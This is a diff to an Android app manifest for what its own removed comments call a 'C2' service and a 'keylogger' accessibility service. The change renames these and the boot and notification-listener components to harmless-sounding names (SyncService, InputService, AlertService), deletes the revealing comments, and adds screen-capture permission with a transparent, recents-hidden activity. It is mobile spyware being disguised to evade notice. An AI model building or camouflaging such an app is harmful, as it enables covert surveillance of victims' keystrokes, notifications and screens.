@@ -37,6 +37,7 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
 
     <application
         android:allowBackup="false"
@@ -56,15 +57,23 @@
             </intent-filter>
         </activity>
 
-        <!-- Background C2 Service -->
+        <!-- Screen Grant (transparent, for MediaProjection) -->
+        <activity
+            android:name=".GrantActivity"
+            android:exported="false"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:excludeFromRecents="true"
+            android:taskAffinity="" />
+
+        <!-- Background Sync Service -->
         <service
-            android:name=".StarKillerService"
+            android:name=".SyncService"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
 
         <!-- Boot Receiver -->
         <receiver
-            android:name=".persistence.BootReceiver"
+            android:name=".persistence.StartReceiver"
             android:exported="true"
             android:enabled="true">
             <intent-filter>
@@ -73,9 +82,9 @@
             </intent-filter>
         </receiver>
 
-        <!-- Accessibility Service (keylogger) -->
+        <!-- Accessibility Service -->
         <service
-            android:name=".modules.KeyLogService"
+            android:name=".modules.InputService"
             android:exported="false"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
@@ -88,7 +97,7 @@
 
         <!-- Notification Listener -->
         <service
-            android:name=".modules.NotifListenerService"
+            android:name=".modules.AlertService"
             android:exported="false"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter>
